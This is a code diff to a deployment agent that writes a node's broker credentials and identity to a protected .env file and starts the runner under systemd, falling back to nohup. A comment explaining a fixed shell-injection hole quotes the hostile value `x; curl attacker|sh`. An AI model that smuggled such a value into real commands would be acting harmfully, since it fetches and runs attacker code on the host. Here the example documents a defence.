@@ -26,6 +26,7 @@ from ..config import (
 )
 from ..core.actor import Actor, Message, MessageType
 from ..core.paths import resolve_state_dir
+from . import node_service
 
 logger = logging.getLogger(__name__)
 
@@ -478,12 +479,34 @@ class InstallerAgent(Actor):
             )
             return str(path)
 
-    async def _put_broker_env(self, sftp: Any, target: DeployTarget, user: str) -> bool:
-        """Write the node's broker credentials to ``~/wactorz/.env``, mode 0600.
+    async def _put_node_env(
+        self,
+        sftp: Any,
+        target: DeployTarget,
+        user: str,
+        node_name: str,
+        broker: str,
+        port: int,
+    ) -> bool:
+        """Write ``~/wactorz/.env``, mode 0600. Returns whether it holds credentials.
 
-        Returns whether anything was written — nothing is when the broker takes
-        anonymous connections, and writing an empty file would then leave the
-        runner exporting two blank variables over a working setup.
+        The file is always written, because it carries the node's identity as
+        well as its broker account, and the systemd unit reads every argument
+        from it. "Written" and "holds credentials" are therefore different
+        answers: an anonymous broker still needs the file, but saying
+        credentials went with it would be a lie.
+
+        ``--port`` has no environment fallback in the runner's parser, unlike
+        ``--broker`` and ``--name``, so ``WACTORZ_PORT`` has to be written
+        rather than assumed — an unset one expands to an empty argument and
+        argparse exits 2.
+
+        Two parsers read this file: a shell sources it on the ``nohup`` path,
+        and systemd reads it as an ``EnvironmentFile`` under a unit.
+        ``shlex.quote`` is the safe intersection — systemd accepts
+        single-quoted values and performs no command substitution — so a value
+        that is safe to source is also taken literally by systemd. A hand-edited
+        ``VAR=$(cmd)`` would not be: the shell runs it, systemd does not.
 
         A node's own ``DEPLOY_<NODE>_BROKER_USER``/``_PASSWORD`` win; otherwise
         it gets the server's. That default is the usable one — a single broker
@@ -496,12 +519,19 @@ class InstallerAgent(Actor):
         sending them over the broker itself would publish the very secret that
         protects it, to a channel that is unauthenticated until they arrive.
         """
-        username = target.broker_user or CONFIG.mqtt_username
-        password = target.broker_password or CONFIG.mqtt_password
-        if not username and not password:
-            return False
+        username = target.broker_user or CONFIG.mqtt_username or ""
+        password = target.broker_password or CONFIG.mqtt_password or ""
+        lines = [
+            f"WACTORZ_NODE={shlex.quote(node_name)}",
+            f"WACTORZ_BROKER={shlex.quote(broker)}",
+            f"WACTORZ_PORT={shlex.quote(str(port))}",
+        ]
+        credentials = bool(username or password)
+        if credentials:
+            lines.append(f"MQTT_USERNAME={shlex.quote(username)}")
+            lines.append(f"MQTT_PASSWORD={shlex.quote(password)}")
 
-        body = f"MQTT_USERNAME={shlex.quote(username)}\nMQTT_PASSWORD={shlex.quote(password)}\n"
+        body = "\n".join(lines) + "\n"
         remote = f"/home/{user}/wactorz/.env"
         async with sftp.open(remote, "w") as handle:
             await handle.write(body)
@@ -509,7 +539,7 @@ class InstallerAgent(Actor):
         # window either way, but a file that is never widened is better than one
         # created world-readable and tightened later.
         await sftp.chmod(remote, 0o600)
-        return True
+        return credentials
 
     async def _ssh_kwargs(self, payload: dict) -> dict:
         """Build asyncssh connection kwargs for a task payload.
@@ -762,10 +792,13 @@ class InstallerAgent(Actor):
                 # credentials it will read from its environment.
                 async with conn.start_sftp_client() as sftp:
                     await sftp.put(str(runner_path), f"/home/{user}/wactorz/remote_runner.py")
-                    env_written = await self._put_broker_env(sftp, target, user)
+                    has_credentials = await self._put_node_env(
+                        sftp, target, user, node_name, str(broker), int(mqtt_port)
+                    )
                 self._log_remote(f"[{node_name}] remote_runner.py uploaded.")
-                if env_written:
-                    self._log_remote(f"[{node_name}] Broker credentials written to ~/wactorz/.env.")
+                self._log_remote(f"[{node_name}] Node environment written to ~/wactorz/.env.")
+                if has_credentials:
+                    self._log_remote(f"[{node_name}] Broker credentials included.")
 
                 # 3. Create venv if it doesn't exist — avoids all --break-system-packages issues
                 ok, out = await self._ssh_run(
@@ -783,39 +816,26 @@ class InstallerAgent(Actor):
                 else:
                     self._log_remote(f"[{node_name}] aiomqtt installed into venv.")
 
-                # 5. Kill any existing instance with this node name.
+                # 5. Kill any existing instance with this node name. This runs
+                # whatever supervision we end up installing: a node deployed
+                # before this step existed has a `nohup` runner live right now,
+                # and starting a unit beside it would leave two runners
+                # answering the same control topics.
                 # The pattern is quoted as one argument rather than wrapped in
                 # literal quotes: a name containing a quote would otherwise end
                 # them and the rest would be read as more shell.
                 pattern = f"remote_runner.py.*--name {node_name}"
                 await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")
 
-                # 6. Start runner using venv python in the background
-                # Every interpolated value is quoted. `broker` comes straight
-                # off the task payload with no validation, so `--broker` used to
-                # accept `x; curl attacker|sh` and run it on the node. `node_name`
-                # is checked by `deploy_name_error`, but that only forbids the
-                # MQTT topic characters `# + /` — a space, a `;` or a `$(…)` is a
-                # perfectly acceptable node name as far as it is concerned.
-                # `~` is left outside the quotes so the remote shell still
-                # expands it.
-                log_path = shlex.quote(f"{node_name}.log")
-                # Sourced, never passed. Putting MQTT_PASSWORD=… in front of the
-                # command would keep it out of the *runner's* argv, but SSH exec
-                # runs `$SHELL -c '<the whole string>'`, and that wrapper's argv
-                # is readable by any local user with `ps` for as long as the
-                # launch takes. Sourcing a 0600 file puts it in no argv at all.
-                launch_env = "set -a; . ~/wactorz/.env; set +a; " if env_written else ""
-                cmd = (
-                    f"{launch_env}"
-                    f"nohup ~/wactorz/venv/bin/python ~/wactorz/remote_runner.py "
-                    f"--broker {shlex.quote(str(broker))} "
-                    f"--port {shlex.quote(str(mqtt_port))} "
-                    f"--name {shlex.quote(node_name)} "
-                    f"> ~/wactorz/{log_path} 2>&1 &"
-                )
-                await self._ssh_run(conn, cmd)
-                self._log_remote(f"[{node_name}] Runner started with venv python.")
+                # 6. Supervise it — a systemd unit at the least-privileged rung
+                # this node supports, and `nohup` only when it supports none.
+                async def run_on_node(command: str) -> tuple[bool, str]:
+                    return await self._ssh_run(conn, command)
+
+                rung = await node_service.install(run_on_node, user=user, home=f"/home/{user}")
+                if rung is node_service.NOHUP:
+                    await self._ssh_run(conn, self._nohup_launch(node_name, broker, mqtt_port))
+                self._log_remote(f"[{node_name}] Runner started — supervision: {rung.label}.")
 
             self._log_remote(
                 f"[{node_name}] Deploy complete! Node will appear in /nodes within 15s."
@@ -827,8 +847,12 @@ class InstallerAgent(Actor):
                 "node_name": node_name,
                 "host": host,
                 "broker": broker,
+                # Reported rather than inferred: a node that fell back to nohup
+                # is otherwise indistinguishable from a supervised one, and the
+                # difference is whether it comes back after a reboot.
+                "supervision": rung.label,
                 "message": (
-                    f"Node '{node_name}' deployed to {user}@{host}. "
+                    f"Node '{node_name}' deployed to {user}@{host} ({rung.label}). "
                     f"It will appear in /nodes within ~15 seconds."
                 ),
             }
@@ -837,6 +861,34 @@ class InstallerAgent(Actor):
             msg = f"Deploy failed for '{node_name}' on {host}: {e}"
             self._log_remote(msg)
             return {"success": False, "node_name": node_name, "host": host, "error": str(e)}
+
+    @staticmethod
+    def _nohup_launch(node_name: str, broker: Any, mqtt_port: Any) -> str:
+        """The unsupervised fallback: what ran on every node before the unit.
+
+        Every interpolated value is quoted. `broker` comes straight off the task
+        payload with no validation, so `--broker` used to accept
+        `x; curl attacker|sh` and run it on the node. `node_name` is checked by
+        `deploy_name_error`, but that only forbids the MQTT topic characters
+        `# + /` — a space, a `;` or a `$(…)` is a perfectly acceptable node name
+        as far as it is concerned. `~` is left outside the quotes so the remote
+        shell still expands it.
+
+        The environment is sourced, never passed. Putting MQTT_PASSWORD=… in
+        front of the command would keep it out of the *runner's* argv, but SSH
+        exec runs `$SHELL -c '<the whole string>'`, and that wrapper's argv is
+        readable by any local user with `ps` for as long as the launch takes.
+        Sourcing a 0600 file puts it in no argv at all.
+        """
+        log_path = shlex.quote(f"{node_name}.log")
+        return (
+            "set -a; . ~/wactorz/.env; set +a; "
+            "nohup ~/wactorz/venv/bin/python ~/wactorz/remote_runner.py "
+            f"--broker {shlex.quote(str(broker))} "
+            f"--port {shlex.quote(str(mqtt_port))} "
+            f"--name {shlex.quote(node_name)} "
+            f"> ~/wactorz/{log_path} 2>&1 &"
+        )
 
     async def _node_run(self, payload: dict) -> dict:
         """Run an arbitrary shell command on a remote node via SSH.
